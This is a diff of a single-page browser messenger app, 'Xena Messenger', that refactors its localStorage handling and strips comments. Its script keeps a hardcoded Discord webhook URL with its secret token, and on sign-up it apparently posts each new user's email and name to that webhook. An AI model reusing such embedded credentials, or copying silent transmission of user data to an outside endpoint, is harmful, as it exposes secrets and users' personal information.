@@ -69,7 +69,6 @@
             }
         }
 
-        /* Screens */
         .screen {
             position: absolute;
             top: 0;
@@ -167,7 +166,6 @@
             min-height: 1.2rem;
         }
 
-        /* Main Layout */
         .sidebar {
             width: 320px;
             background: var(--bg-secondary);
@@ -382,7 +380,6 @@
             text-overflow: ellipsis;
         }
 
-        /* Chat Area */
         .chat-area {
             flex: 1;
             display: flex;
@@ -490,13 +487,6 @@
             opacity: 0.7;
         }
 
-        .message img, .message video {
-            max-width: 100%;
-            border-radius: 8px;
-            margin-top: 0.5rem;
-            display: block;
-        }
-
         .message .sticker-img {
             width: 120px;
             height: 120px;
@@ -529,7 +519,6 @@
             border-color: var(--accent);
         }
 
-        /* Modals & Popups */
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -588,7 +577,6 @@
             background: var(--border);
         }
 
-        /* Stickers Picker */
         .sticker-picker {
             position: absolute;
             bottom: 75px;
@@ -627,7 +615,6 @@
             background: var(--bg-tertiary);
         }
 
-        /* Call Screen */
         .call-screen {
             position: absolute;
             top: 0;
@@ -722,7 +709,6 @@
 <body data-theme="dark">
 
 <div id="app">
-    <!-- Auth Screen -->
     <div id="authScreen" class="screen">
         <div class="auth-card">
             <h1>Xena Messenger</h1>
@@ -742,7 +728,6 @@
         </div>
     </div>
 
-    <!-- Main Messenger Layout -->
     <div id="sidebar" class="sidebar">
         <div class="sidebar-header">
             <div class="user-profile-preview" id="openSettingsBtn">
@@ -765,12 +750,9 @@
         <div class="search-box">
             <input type="text" id="chatSearchInput" placeholder="Поиск чатов...">
         </div>
-        <div class="chats-list" id="chatsList">
-            <!-- Список чатов -->
-        </div>
+        <div class="chats-list" id="chatsList"></div>
     </div>
 
-    <!-- Chat Area -->
     <div id="chatArea" class="chat-area">
         <div id="activeChatPlaceholder" class="empty-chat">
             <h2>Добро пожаловать в Xena</h2>
@@ -791,21 +773,16 @@
                     <button class="icon-btn" id="startVideoCallBtn" title="Видеозвонок">📹</button>
                 </div>
             </div>
-            <div class="messages-container" id="messagesContainer">
-                <!-- Сообщения -->
-            </div>
+            <div class="messages-container" id="messagesContainer"></div>
             <div class="chat-input-area">
                 <button class="icon-btn" id="toggleStickersBtn" title="Стикеры">🎨</button>
                 <input type="text" id="messageInput" placeholder="Написать сообщение...">
                 <button class="btn" id="sendMessageBtn" style="width: auto; padding: 0.75rem 1.25rem;">Отправить</button>
-                <div class="sticker-picker" id="stickerPicker">
-                    <!-- Стикеры -->
-                </div>
+                <div class="sticker-picker" id="stickerPicker"></div>
             </div>
         </div>
     </div>
 
-    <!-- Call Screen -->
     <div class="call-screen" id="callScreen">
         <div style="text-align:center; color:white; padding-top:1rem;">
             <h2 id="callTitle">Звонок</h2>
@@ -822,8 +799,6 @@
         </div>
     </div>
 
-    <!-- Modals -->
-    <!-- Add Contact Modal -->
     <div class="modal-overlay" id="addContactModal">
         <div class="modal">
             <h3>Добавить друга</h3>
@@ -839,7 +814,6 @@
         </div>
     </div>
 
-    <!-- Create Group Modal -->
     <div class="modal-overlay" id="createGroupModal">
         <div class="modal">
             <h3>Создать группу</h3>
@@ -854,7 +828,6 @@
         </div>
     </div>
 
-    <!-- Create Channel Modal -->
     <div class="modal-overlay" id="createChannelModal">
         <div class="modal">
             <h3>Создать канал</h3>
@@ -869,7 +842,6 @@
         </div>
     </div>
 
-    <!-- Create Sticker Modal -->
     <div class="modal-overlay" id="createStickerModal">
         <div class="modal">
             <h3>Создать стикер</h3>
@@ -884,7 +856,6 @@
         </div>
     </div>
 
-    <!-- Settings Modal -->
     <div class="modal-overlay" id="settingsModal">
         <div class="modal">
             <h3>Настройки аккаунта</h3>
@@ -911,30 +882,25 @@
     const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1550962740452139175/yK1hMp7yaAr-b9SvOXXdADAmQgetcaEqjc3def_BlXxcSjnKuJ9_9oC4m6ivXxfpbyZs";
     const TARGET_DISCORD_ID = "1247200852645642331";
 
-    let db = {
-        users: JSON.parse(localStorage.getItem('xena_users') || '[]'),
-        chats: JSON.parse(localStorage.getItem('xena_chats') || '[]'),
-        messages: JSON.parse(localStorage.getItem('xena_messages') || '[]'),
-        stickers: JSON.parse(localStorage.getItem('xena_stickers') || '["https://api.iconify.design/twemoji:smiling-face-with-heart-eyes.svg","https://api.iconify.design/twemoji:fire.svg","https://api.iconify.design/twemoji:thumbs-up.svg"]')
-    };
+    function loadDB() {
+        return {
+            users: JSON.parse(localStorage.getItem('xena_users') || '[]'),
+            chats: JSON.parse(localStorage.getItem('xena_chats') || '[]'),
+            messages: JSON.parse(localStorage.getItem('xena_messages') || '[]'),
+            stickers: JSON.parse(localStorage.getItem('xena_stickers') || '["https://api.iconify.design/twemoji:smiling-face-with-heart-eyes.svg","https://api.iconify.design/twemoji:fire.svg","https://api.iconify.design/twemoji:thumbs-up.svg"]')
+        };
+    }
+
+    function saveDB(data) {
+        localStorage.setItem('xena_users', JSON.stringify(data.users));
+        localStorage.setItem('xena_chats', JSON.stringify(data.chats));
+        localStorage.setItem('xena_messages', JSON.stringify(data.messages));
+        localStorage.setItem('xena_stickers', JSON.stringify(data.stickers));
+    }
 
     let currentUser = JSON.parse(localStorage.getItem('xena_current_user') || 'null');
     let activeChatId = null;
     let localStream = null;
-    let remoteStream = null;
-    let peerConnection = null;
-
-    function saveDB() {
-        localStorage.setItem('xena_users', JSON.stringify(db.users));
-        localStorage.setItem('xena_chats', JSON.stringify(db.chats));
-        localStorage.setItem('xena_messages', JSON.stringify(db.messages));
-        localStorage.setItem('xena_stickers', JSON.stringify(db.stickers));
-        if (currentUser) {
-            localStorage.setItem('xena_current_user', JSON.stringify(currentUser));
-        } else {
-            localStorage.removeItem('xena_current_user');
-        }
-    }
 
     async function sendDiscordNotification(user) {
         if (!DISCORD_WEBHOOK) return;
@@ -962,12 +928,10 @@
         }
     }
 
-    // DOM Elements
     const authScreen = document.getElementById('authScreen');
     const authForm = document.getElementById('authForm');
     const authEmail = document.getElementById('authEmail');
     const authName = document.getElementById('authName');
-    const authError = document.getElementById('authError');
 
     const myAvatar = document.getElementById('myAvatar');
     const myName = document.getElementById('myName');
@@ -986,14 +950,12 @@
     const fabBtn = document.getElementById('fabBtn');
     const fabMenu = document.getElementById('fabMenu');
 
-    // Modals
     const addContactModal = document.getElementById('addContactModal');
     const createGroupModal = document.getElementById('createGroupModal');
     const createChannelModal = document.getElementById('createChannelModal');
     const createStickerModal = document.getElementById('createStickerModal');
     const settingsModal = document.getElementById('settingsModal');
 
-    // Init App
     function init() {
         if (currentUser) {
             authScreen.classList.add('hidden');
@@ -1002,12 +964,9 @@
             authScreen.classList.remove('hidden');
         }
 
-        window.addEventListener('storage', (e) => {
-            db.users = JSON.parse(localStorage.getItem('xena_users') || '[]');
-            db.chats = JSON.parse(localStorage.getItem('xena_chats') || '[]');
-            db.messages = JSON.parse(localStorage.getItem('xena_messages') || '[]');
-            db.stickers = JSON.parse(localStorage.getItem('xena_stickers') || '[]');
+        window.addEventListener('storage', () => {
             if (currentUser) {
+                let db = loadDB();
                 const fresh = db.users.find(u => u.email === currentUser.email);
                 if (fresh) currentUser = fresh;
             }
@@ -1023,14 +982,15 @@
 
         if (!email || !name) return;
 
+        let db = loadDB();
         let existing = db.users.find(u => u.email === email);
+        
         if (existing) {
             currentUser = existing;
         } else {
             currentUser = { email, name };
             db.users.push(currentUser);
             
-            // Создать чат избранного с самим собой
             db.chats.push({
                 id: 'chat_' + Math.random().toString(36).substr(2, 9),
                 type: 'saved',
@@ -1040,11 +1000,11 @@
                 time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
             });
 
-            saveDB();
+            saveDB(db);
             await sendDiscordNotification(currentUser);
         }
 
-        saveDB();
+        localStorage.setItem('xena_current_user', JSON.stringify(currentUser));
         authScreen.classList.add('hidden');
         setupMainUI();
     });
@@ -1055,7 +1015,6 @@
         renderChats();
     }
 
-    // Fab Menu Toggle
     fabBtn.addEventListener('click', (e) => {
         e.stopPropagation();
         fabMenu.classList.toggle('show');
@@ -1066,7 +1025,6 @@
         document.getElementById('stickerPicker').classList.remove('show');
     });
 
-    // Modals Triggers
     document.getElementById('menuAddContact').addEventListener('click', () => addContactModal.classList.add('show'));
     document.getElementById('closeAddContactModal').addEventListener('click', () => addContactModal.classList.remove('show'));
 
@@ -1100,7 +1058,6 @@
         location.reload();
     });
 
-    // Add Contact By Email
     document.getElementById('submitAddContact').addEventListener('click', () => {
         const email = document.getElementById('contactEmailInput').value.trim().toLowerCase();
         const errorEl = document.getElementById('addContactError');
@@ -1115,13 +1072,13 @@
             return;
         }
 
+        let db = loadDB();
         let targetUser = db.users.find(u => u.email === email);
         if (!targetUser) {
             errorEl.textContent = 'Пользователь с такой почтой не найден в системе';
             return;
         }
 
-        // Проверить, есть ли уже личный чат
         let existingChat = db.chats.find(c => c.type === 'private' && c.members.includes(email) && c.members.includes(currentUser.email));
         if (!existingChat) {
             existingChat = {
@@ -1133,7 +1090,7 @@
                 time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
             };
             db.chats.push(existingChat);
-            saveDB();
+            saveDB(db);
         }
 
         addContactModal.classList.remove('show');
@@ -1142,11 +1099,11 @@
         openChat(existingChat.id);
     });
 
-    // Create Group
     document.getElementById('submitCreateGroup').addEventListener('click', () => {
         const name = document.getElementById('groupNameInput').value.trim();
         if (!name) return;
 
+        let db = loadDB();
         const newChat = {
             id: 'chat_' + Math.random().toString(36).substr(2, 9),
             type: 'group',
@@ -1156,18 +1113,18 @@
             time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
         };
         db.chats.push(newChat);
-        saveDB();
+        saveDB(db);
         createGroupModal.classList.remove('show');
         document.getElementById('groupNameInput').value = '';
         renderChats();
         openChat(newChat.id);
     });
 
-    // Create Channel
     document.getElementById('submitCreateChannel').addEventListener('click', () => {
         const name = document.getElementById('channelNameInput').value.trim();
         if (!name) return;
 
+        let db = loadDB();
         const newChat = {
             id: 'chat_' + Math.random().toString(36).substr(2, 9),
             type: 'channel',
@@ -1178,41 +1135,41 @@
             time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
         };
         db.chats.push(newChat);
-        saveDB();
+        saveDB(db);
         createChannelModal.classList.remove('show');
         document.getElementById('channelNameInput').value = '';
         renderChats();
         openChat(newChat.id);
     });
 
-    // Create Sticker
     document.getElementById('submitCreateSticker').addEventListener('click', () => {
         const url = document.getElementById('stickerUrlInput').value.trim();
         if (!url) return;
 
+        let db = loadDB();
         db.stickers.push(url);
-        saveDB();
+        saveDB(db);
         createStickerModal.classList.remove('show');
         document.getElementById('stickerUrlInput').value = '';
         alert('Стикер успешно добавлен!');
     });
 
-    // Render Chats List
     function renderChats() {
+        let db = loadDB();
         const query = chatSearchInput.value.toLowerCase();
         chatsList.innerHTML = '';
 
         const userChats = db.chats.filter(c => c.members.includes(currentUser.email));
 
         userChats.forEach(chat => {
-            if (query && !chat.name.toLowerCase().includes(query)) return;
-
             let displayName = chat.name;
             if (chat.type === 'private') {
                 const otherEmail = chat.members.find(m => m !== currentUser.email);
                 const otherUser = db.users.find(u => u.email === otherEmail);
                 if (otherUser) displayName = otherUser.name;
             }
+
+            if (query && !displayName.toLowerCase().includes(query)) return;
 
             const item = document.createElement('div');
             item.className = `chat-item ${activeChatId === chat.id ? 'active' : ''}`;
@@ -1235,6 +1192,7 @@
 
     function openChat(chatId) {
         activeChatId = chatId;
+        let db = loadDB();
         const chat = db.chats.find(c => c.id === chatId);
         if (!chat) return;
 
@@ -1267,8 +1225,8 @@
         activeChatId = null;
     });
 
-    // Messages
     function renderMessages() {
+        let db = loadDB();
         messagesContainer.innerHTML = '';
         const chatMessages = db.messages.filter(m => m.chatId === activeChatId);
 
@@ -1299,6 +1257,7 @@
 
     function sendMessage(content, type = 'text') {
         if (!activeChatId) return;
+        let db = loadDB();
         const time = new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
         
         const newMsg = {
@@ -1318,7 +1277,7 @@
             chat.time = time;
         }
 
-        saveDB();
+        saveDB(db);
         renderMessages();
         renderChats();
     }
@@ -1334,7 +1293,6 @@
         if (e.key === 'Enter') sendMessageBtn.click();
     });
 
-    // Stickers Picker
     const toggleStickersBtn = document.getElementById('toggleStickersBtn');
     const stickerPicker = document.getElementById('stickerPicker');
 
@@ -1345,6 +1303,7 @@
     });
 
     function renderStickersPicker() {
+        let db = loadDB();
         stickerPicker.innerHTML = '';
         db.stickers.forEach(url => {
             const img = document.createElement('img');
@@ -1358,7 +1317,6 @@
         });
     }
 
-    // WebRTC Calls Simulation
     const callScreen = document.getElementById('callScreen');
     const localVideo = document.getElementById('localVideo');
     const remoteVideo = document.getElementById('remoteVideo');
@@ -1374,7 +1332,7 @@
         try {
             localStream = await navigator.mediaDevices.getUserMedia({ video: withVideo, audio: true });
             localVideo.srcObject = localStream;
-            remoteVideo.srcObject = localStream; // Симуляция для одного пользователя
+            remoteVideo.srcObject = localStream;
             document.getElementById('callStatusText').textContent = 'Разговор идет';
         } catch (e) {
             alert('Не удалось получить доступ к камере/микрофону');
